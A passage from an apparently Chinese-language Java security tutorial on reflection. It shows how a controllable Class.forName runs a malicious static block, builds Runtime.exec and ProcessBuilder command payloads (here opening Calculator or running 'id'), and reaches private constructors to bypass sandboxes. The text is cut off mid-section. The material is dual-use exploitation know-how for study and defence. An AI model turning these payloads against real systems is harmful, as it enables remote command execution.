class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Static initial %s\n&quot;</span>, TrainPrint.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TrainPrint</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Initial %s\n&quot;</span>, <span class="built_in">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 类初始化</span></span><br><span class="line">        <span class="comment">// Class.forName(&quot;reflection.TrainPrint&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 类实例化</span></span><br><span class="line">        <span class="type">TrainPrint</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TrainPrint</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">类初始化输出结果</span></span><br><span class="line"><span class="comment">  Static initial class reflection.TrainPrint</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">类实例化输出结果</span></span><br><span class="line"><span class="comment">  Static initial class reflection.TrainPrint</span></span><br><span class="line"><span class="comment">  Empty block initial class reflection.TrainPrint</span></span><br><span class="line"><span class="comment">  Initial class reflection.TrainPrint</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>其中，<code>static&#123;&#125;</code>就是在<strong>类初始化</strong>时调用的，<code>&#123;&#125;</code>则会在构造函数的<code>super&#123;&#125;</code>后面，但在当前构造函数内容的前面。上面例子执行顺序为：</p><ul><li>类初始化：<code>static&#123;&#125;</code></li><li>类实例化：<code>static&#123;&#125; -&gt; &#123;&#125; -&gt; 构造函数</code></li></ul><p>所以，<code>forName</code>中的<code>initialize</code>其实是决定是否执⾏<strong>类初始化</strong>，而不是<strong>类实例化</strong></p><h3 id="简单利用"><a href="#简单利用" class="headerlink" title="简单利用"></a>简单利用</h3><p>上面说到，在使用<code>forName()</code>进行类初始化时，会执行<code>static&#123;&#125;</code>中的代码<br>假设存在一个函数，其中的<code>className</code>可控</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-8tflarlr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-8tflarlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestRef</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class.forName(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;reflection.TestCalc&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">TestRef</span> <span class="variable">testRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestRef</span>();</span><br><span class="line">        testRef.ref(className);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>那么可以构造一个恶意类，在<code>static&#123;&#125;</code>中编写恶意代码。当这个恶意类被带入目标机器该函数时，触发<code>forName</code>进行类初始化，从而执行其中的恶意代码（实际情况中如果需要将这个恶意类带⼊⽬标机器中，就涉及到<code>ClassLoader</code>的利⽤）</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-5k5jbrlr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-5k5jbrlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCalc</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E5%8F%8D%E5%B0%84%E7%AF%87-0.png" data-caption="Java安全漫谈-反射篇-0"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E5%8F%8D%E5%B0%84%E7%AF%87-0.png" alt="Java安全漫谈-反射篇-0"></a></p><h3 id="获取类对象的其它函数"><a href="#获取类对象的其它函数" class="headerlink" title="获取类对象的其它函数"></a>获取类对象的其它函数</h3><p><code>forName</code>不是获取“类”的唯⼀途径，通常有三种⽅式获取⼀个“类”，也就是<code>java.lang.Class</code>对象：</p><ul><li><code>Class.forName(className)</code>，如果已经知道某个类的名字，这样可以获取到它的类</li><li><code>obj.getClass()</code>，如果上下文存在某个类的实例<code>obj</code>，可以直接获取到它的类</li><li><code>Test.class</code>，如果已经加载了某个类，只是想获取它的<code>java.lang.Class</code>对象，那么直接取它的<code>class</code>属性即可。这个方法其实不属于反射<blockquote><p>上面第1和第2种方式获取Class对象时会导致<strong>类属性</strong>被初始化，而且只会执行一次。</p></blockquote></li></ul><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-8h3elelr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-8h3elelr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestReflection</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">class1</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">class2</span> <span class="operator">=</span> java.lang.Runtime.class;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">class3</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader().loadClass(className);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h3 id="调用内部类"><a href="#调用内部类" class="headerlink" title="调用内部类"></a>调用内部类</h3><blockquote><p>在正常情况下，除了系统类，如果我们想拿到一个类，需要先<code>import</code>才能使用。而使用<code>forName</code>就不需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类。</p></blockquote><p>另外，经常在一些源码里看到，类名的部分包含<code>$</code>符号，比如 Fastjson 在<code>checkAutoType</code>时就会先将<code>$</code>替换成<code>.</code>（参考链接：<a href="https://github.com/alibaba/fastjson/blob/fcc9c2a/src/main/java/com/alibaba/fastjson/parser/ParserConfig.java#L1038">fastjson&#x2F;parser&#x2F;ParserConfig.java#L1038</a>）<br><code>**$**</code><strong>的作用是查找内部类</strong>：Java 的普通类<code>C1</code>中支持编写内部类<code>C2</code>，而在编译的时候，会生成两个文件：<code>C1.class</code>和<code>C1$C2.class</code>，通过<code>Class.forName(&quot;C1$C2&quot;)</code>即可加载这个内部类。</p><h2 id="Class-newInstance"><a href="#Class-newInstance" class="headerlink" title="Class.newInstance"></a>Class.newInstance</h2><blockquote><p>获得类以后，可以继续使用反射来获取类中的属性和方法，也可以实例化这个类再调用方法。</p></blockquote><p><a href="https://docs.oracle.com/javase/7/docs/api/java/lang/Class.html#newInstance%28%29">Class.newInstance()</a>，Java反射框架中<strong>类对象创建新的实例化对象</strong>的方法。作用就是调用这个类的无参构造函数。当调用<code>newInstance</code>不成功时，原因可能是：</p><ul><li>使用的类没有无参构造函数</li><li>使用的类构造函数是私有的</li></ul><h3 id="私有的类构造方法"><a href="#私有的类构造方法" class="headerlink" title="私有的类构造方法"></a>私有的类构造方法</h3><p>最常见的情况就是<code>java.lang.Runtime</code>，这个类在构造命令执行Payload时经常用到，但不能直接这样来执行命令：</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-9fblgslr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-9fblgslr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNewInstance</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="string">&quot;id&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 报错</span></span><br><span class="line"><span class="comment">Exception ... can not access a member of class java.lang.Runtime with modifiers &quot;private&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>原因是<code>java.lang.Runtime</code>这个类的构造方法是私有的，这里涉及到<a href="https://www.runoob.com/design-pattern/singleton-pattern.html">单例模式</a>的设计思想（比如Web应用中的数据库链接，通常只需要链接一次。此时可以将数据库链接所使用的类的构造函数设为私有，这样<strong>只有在类初始化时才会执行一次构造函数</strong>，然后通过编写一个静态方法来获取这个数据库对象）<br>这里<code>Runtime</code>类也使用了单例模式，因此只能通过<code>Runtime.getRuntime()</code>来获取<code>Runtime</code>对象。所以需要修改为：</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-k76m4slr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-k76m4slr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNewInstance</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(</span><br><span class="line">            clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz), </span><br><span class="line">            <span class="string">&quot;open /System/Applications/Calculator.app&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><h3 id="getMethod和invoke"><a href="#getMethod和invoke" class="headerlink" title="getMethod和invoke"></a>getMethod和invoke</h3><blockquote><p>上面的例子中用到了<code>getMethod()</code>和<code>invoke()</code>方法。正常执行方法是<code>[1].method([2], [3], [4]...)</code> ，在反射里就是<code>method.invoke([1], [2], [3], [4]...)</code></p></blockquote><p><code>getMethod()</code>，作用是通过反射获取Class对象的指定公有方法，调用<code>getMethod()</code>时需要根据获取的方法传递对应的<strong>参数类型列表</strong>。<br>例如需要调用<code>Runtime.exec()</code>方法，该方法有6个重载，以第一个为例：<code>exec(String command)</code>，那么就需要传递一个<code>String</code>类的类对象</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-edj07vlr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-edj07vlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getMethod(<span class="string">&quot;exec&quot;</span>, String.class)</span><br><span class="line">            </span><br></pre></td></tr></table></div></figure><p><code>invoke()</code>属于<code>Method</code>类，作用是对方法进行调用</p><ul><li>如果执行的是普通方法，那么第一个参数是类对象</li><li>如果执行的是静态方法，那么第一个参数是类</li></ul><p>所以前面的例子也可以修改为：</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-67okbflr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-67okbflr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNewInstance</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);    </span><br><span class="line">        <span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(clazz);</span><br><span class="line">        </span><br><span class="line">        execMethod.invoke(runtime, <span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>这里有2个问题：</p><ul><li>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，怎样通过反射实例化该类？</li><li>如果一个方法或构造方法是私有方法，是否能够通过反射执行？</li></ul><h2 id="Class-getConstructor"><a href="#Class-getConstructor" class="headerlink" title="Class.getConstructor"></a>Class.getConstructor</h2><blockquote><p>如果一个类没有无参构造方法，也没有单例模式里的静态方法，怎样通过反射实例化该类？</p></blockquote><p><a href="https://docs.oracle.com/javase/7/docs/api/java/lang/Class.html#getConstructor%28java.lang.Class...%29">Class.getConstructor()</a>，作用是获取构造函数对象，接收的参数是<strong>构造函数的参数类型列表</strong>。获取到构造函数后，使用<code>newInstance</code>来进行实例化<br>以另一种命令执行方式<code>ProcessBuilder</code>类为例，该类有两个构造函数：</p><ul><li><code>public ProcessBuilder(List&lt;String&gt; command)</code></li><li><code>public ProcessBuilder(String... command)</code></li></ul><h3 id="反射替代强制类型转换"><a href="#反射替代强制类型转换" class="headerlink" title="反射替代强制类型转换"></a>反射替代强制类型转换</h3><p>第一种构造函数，需要传入<code>List.class</code>类对象。先通过反射来获取其构造函数，再调用<code>start()</code>方法执行命令：</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-syhjqmlr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-syhjqmlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestProcessBuilder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        ((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>))).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>这个Payload用到了强制类型转换，实际情况下利用漏洞的时候没有这种语法，所以需要利用反射来完成这一步。这里通过<code>getMethod(&quot;start&quot;)</code>获取到<code>start</code>方法，然后<code>invoke</code>执行，<code>invoke</code>的第一个参数就是<code>ProcessBuilder</code>类对象</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-wqhfmplr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-wqhfmplr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestProcessBuilder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line"></span><br><span class="line">        clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(</span><br><span class="line">            clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>))</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h3 id="可变长参数"><a href="#可变长参数" class="headerlink" title="可变长参数"></a>可变长参数</h3><p>第二种构造函数，传递的参数为<code>(String... command)</code>，即表示这是一个可变长参数。如果想要在反射中获取这种参数，将其看作数组即可：</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-qun0vwlr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-qun0vwlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getConstructor(String[].class);</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>在调用<code>newInstance</code>的时候，因为这个函数本身接收的是一个可变长参数，<code>ProcessBuilder</code>所接收的也是一个可变长参数，二者叠加为一个二维数组，所以整个Payload如下：</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-382z4rlr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-382z4rlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestProcessBuilder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        ((ProcessBuilder) clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;&#125;)).start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>同样地可以利用完全反射完成：</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-14r3w7lr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-14r3w7lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestProcessBuilder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(</span><br><span class="line">            clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;&#125;)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h2 id="Class-getDeclared"><a href="#Class-getDeclared" class="headerlink" title="Class.getDeclared"></a>Class.getDeclared</h2><blockquote><p>如果一个方法或构造方法是私有方法，是否能够通过反射执行？</p></blockquote><p>这里涉及到<code>getDeclared</code>系列的方法：<a href="https://docs.oracle.com/javase/7/docs/api/java/lang/Class.html#getDeclaredMethod%28java.lang.String,%20java.lang.Class...%29">getDeclaredMethod()</a>和<a href="https://docs.oracle.com/javase/7/docs/api/java/lang/Class.html#getDeclaredConstructor%28java.lang.Class...%29">getDeclaredConstructor()</a>。它们和普通<code>getMethod()/getConstructor()</code>的用法类似，主要区别在于：</p><ul><li><code>getMethod()</code>系列方法获取的是当前类中所有公共方法，包括从父类继承的方法</li><li><code>getDeclaredMethod()</code>系列方法获取的是当前类中“声明”的方法，包括私有方法，但不包括从父类继承的方法</li></ul><h3 id="反射私有构造方法"><a href="#反射私有构造方法" class="headerlink" title="反射私有构造方法"></a>反射私有构造方法</h3><ul><li>以<code>java.lang.Runtime</code>类为例，前文说到这个类的构造方法是私有的。这里可以直接调用<code>getDeclaredConstructor()</code>来获取这个私有的构造方法来实例化对象，从而执行命令<ul><li>需要注意的是，获取私有方法后需要用<code>setAccessible()</code>修改其作用域，否则仍然不能调用。</li></ul></li></ul><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-lxgtaglr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-lxgtaglr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDeclared</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cs</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">        cs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(</span><br><span class="line">            cs.newInstance(), </span><br><span class="line">            <span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h2 id="实例-沙盒绕过"><a href="#实例-沙盒绕过" class="headerlink" title="实例-沙盒绕过"></a>实例-沙盒绕过</h2><blockquote><p>在安全研究中，我们使⽤反射的⼀⼤⽬的，就是绕过某些沙盒。</p></blockquote><p>⽐如上下⽂中如果只有<code>Integer</code>类型的数字，如何获取到可以执⾏命令的<code>Runtime</code>类呢，伪代码：</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-n5cc5wlr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-n5cc5wlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 